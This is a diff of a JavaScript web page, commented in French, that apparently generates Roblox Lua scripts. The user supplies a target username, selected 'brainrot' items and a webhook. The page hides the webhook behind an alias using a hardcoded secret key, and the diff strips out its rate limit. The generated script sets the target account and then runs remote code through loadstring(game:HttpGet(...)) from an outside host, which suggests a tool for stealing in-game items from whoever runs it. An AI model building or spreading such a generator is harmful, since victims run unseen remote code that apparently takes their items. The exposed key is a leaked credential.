@@ -797,19 +797,12 @@ function setAdminMode(mode) {
 function updateCustomAdmin() {
   customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
 }
-// Fonction pour rechercher des utilisateurs Roblox
-// Fonction pour rechercher des utilisateurs Roblox
 async function searchRobloxUsers(query) {
   if (query.length < 3) return [];
-
   try {
     const proxyUrl = `https://vercel-proxy-imranouarezki-1231-mlks-projects-77cf306c.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
-
     const response = await fetch(proxyUrl);
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
-    }
-
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     return data.data || [];
   } catch (error) {
@@ -818,26 +811,24 @@ async function searchRobloxUsers(query) {
   }
 }
 
-// Fonction pour afficher les suggestions
 function showSuggestions(users) {
-  const suggestionsContainer = document.getElementById('usernameSuggestions');
-  suggestionsContainer.innerHTML = '';
-
+  const container = document.getElementById('usernameSuggestions');
+  container.innerHTML = '';
   if (users.length === 0) {
     if (document.getElementById('usernameInput').value.trim().length >= 3) {
       const noResult = document.createElement('div');
       noResult.className = 'suggestion-item';
       noResult.innerHTML = '<span class="suggestion-username" style="color: var(--muted);">No users found.(beta)</span>';
-      suggestionsContainer.appendChild(noResult);
+      container.appendChild(noResult);
     }
-    suggestionsContainer.style.display = 'block';
+    container.style.display = 'block';
     return;
   }
 
   users.forEach(user => {
-    const suggestionItem = document.createElement('div');
-    suggestionItem.className = 'suggestion-item';
-    suggestionItem.innerHTML = `
+    const item = document.createElement('div');
+    item.className = 'suggestion-item';
+    item.innerHTML = `
       <div class="suggestion-avatar">
         <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${user.id}-Png/48/48/AvatarHeadshot/Png/noFilter" alt="${user.name}">
       </div>
@@ -847,20 +838,16 @@ function showSuggestions(users) {
       </div>
       <span class="suggestion-id">${user.id}</span>
     `;
-
-    suggestionItem.onclick = () => {
+    item.onclick = () => {
       document.getElementById('usernameInput').value = user.name;
-      suggestionsContainer.style.display = 'none';
+      container.style.display = 'none';
       validateUsername();
     };
-
-    suggestionsContainer.appendChild(suggestionItem);
+    container.appendChild(item);
   });
-
-  suggestionsContainer.style.display = 'block';
+  container.style.display = 'block';
 }
 
-// Debounce (un seul suffit)
 const debounce = (func, delay) => {
   let timeoutId;
   return function(...args) {
@@ -869,8 +856,7 @@ const debounce = (func, delay) => {
   };
 };
 
-// Un seul listener
-document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
+document.getElementById('usernameInput').addEventListener('input', debounce(async (e) => {
   const query = e.target.value.trim();
   if (query.length === 0) {
     document.getElementById('usernameSuggestions').style.display = 'none';
@@ -879,41 +865,36 @@ document.getElementById('usernameInput').addEventListener('input', debounce(asyn
   const users = await searchRobloxUsers(query);
   showSuggestions(users);
 }, 300));
+
+// ====================== AUTRES FONCTIONS ======================
 function renderList(filter) {
-    const q = (filter || '').toLowerCase();
-    const list = document.getElementById('animalList');
-    list.innerHTML = '';
-    ANIMALS.forEach(animal => {
-      if (q && !animal.name.toLowerCase().includes(q)) return;
-      const row = document.createElement('div');
-      row.className = 'a-item' + (selected.has(animal.name) ? ' on' : '');
-      const cb = document.createElement('input');
-      cb.type = 'checkbox';
-      cb.checked = selected.has(animal.name);
-      cb.addEventListener('change', e => { e.stopPropagation(); toggle(animal.name); });
+  const q = (filter || '').toLowerCase();
+  const list = document.getElementById('animalList');
+  list.innerHTML = '';
+  ANIMALS.forEach(animal => {
+    if (q && !animal.name.toLowerCase().includes(q)) return;
+    const row = document.createElement('div');
+    row.className = 'a-item' + (selected.has(animal.name) ? ' on' : '');
+    const cb = document.createElement('input');
+    cb.type = 'checkbox';
+    cb.checked = selected.has(animal.name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(animal.name); });
+    const lbl = document.createElement('span');
+    lbl.className = 'a-name';
+    lbl.textContent = animal.name;
+    const badge = document.createElement('span');
+    badge.className = animal.rarity === 'OG' ? 'badge-og' : 'badge-secret';
+    badge.textContent = animal.rarity;
+    const mps = document.createElement('span');
+    mps.className = 'a-meta';
+    mps.textContent = animal.mps;
+    row.append(cb, lbl, badge, mps);
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
+    list.appendChild(row);
+  });
+  document.getElementById('selNum').textContent = selected.size;
+}
 
-      const lbl = document.createElement('span');
-      lbl.className = 'a-name';
-      lbl.textContent = animal.name;
-
-      // Badge OG ou Secret
-      const badge = document.createElement('span');
-      badge.className = animal.rarity === 'OG' ? 'badge-og' : 'badge-secret';
-      badge.textContent = animal.rarity;
-
-      const mps = document.createElement('span');
-      mps.className = 'a-meta';
-      mps.textContent = animal.mps;
-
-      row.appendChild(cb);
-      row.appendChild(lbl);
-      row.appendChild(badge);
-      row.appendChild(mps);
-      row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
-      list.appendChild(row);
-    });
-    document.getElementById('selNum').textContent = selected.size;
-  }
 function toggle(name) {
   selected.has(name) ? selected.delete(name) : selected.add(name);
   renderList(document.getElementById('searchBox').value);
@@ -951,20 +932,10 @@ function validateWebhook() {
   }
 }
 
+// ====================== GENERATE (corrigé) ======================
 async function generate() {
   const btn = document.querySelector('.btn-gen');
   const out = document.getElementById('outputBlock');
-
-  // === ANTI-SPAM CLIENT (1 génération par heure) ===
-  const lastGen = localStorage.getItem('lastGenerationTime');
-  const now = Date.now();
-
-  if (lastGen && (now - parseInt(lastGen)) < 3600000) {   // 1 heure = 3600000 ms
-    const remaining = Math.ceil((3600000 - (now - parseInt(lastGen))) / 60000);
-    out.className = 'code-block empty';
-    out.textContent = `-- Tu as déjà généré un script récemment.\nAttends ${remaining} minute(s).`;
-    return;
-  }
 
   if (btn.disabled) return;
   btn.disabled = true;
@@ -983,19 +954,15 @@ async function generate() {
 
     const response = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
-      headers: { 
+      headers: {
         'Content-Type': 'application/json',
-        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'   // ← Ta clé
+        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'
       },
       body: JSON.stringify({ alias, url: webhook })
     });
 
     if (!response.ok) throw new Error('KV store failed');
 
-    // === Enregistrement du timestamp anti-spam ===
-    localStorage.setItem('lastGenerationTime', now.toString());
-
-    // Génération du script
     const names = [...selected];
     const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -1011,9 +978,7 @@ getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
 }
-
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))()
-
 ${adminScriptPart}
 `;
 
@@ -1021,10 +986,9 @@ ${adminScriptPart}
     out.textContent = script;
 
   } catch (err) {
-  console.error(err);
-  out.className = 'code-block empty';
-  out.textContent = '-- Une erreur est survenue lors de la génération.';
-}
+    console.error(err);
+    out.className = 'code-block empty';
+    out.textContent = err.message || '-- Une erreur est survenue lors de la génération.';
   } finally {
     setTimeout(() => {
       btn.disabled = false;
@@ -1033,6 +997,7 @@ ${adminScriptPart}
     }, 1500);
   }
 }
+
 function copyOut() {
   const code = document.getElementById('outputBlock').textContent;
   if (!code || code.startsWith('--')) return;
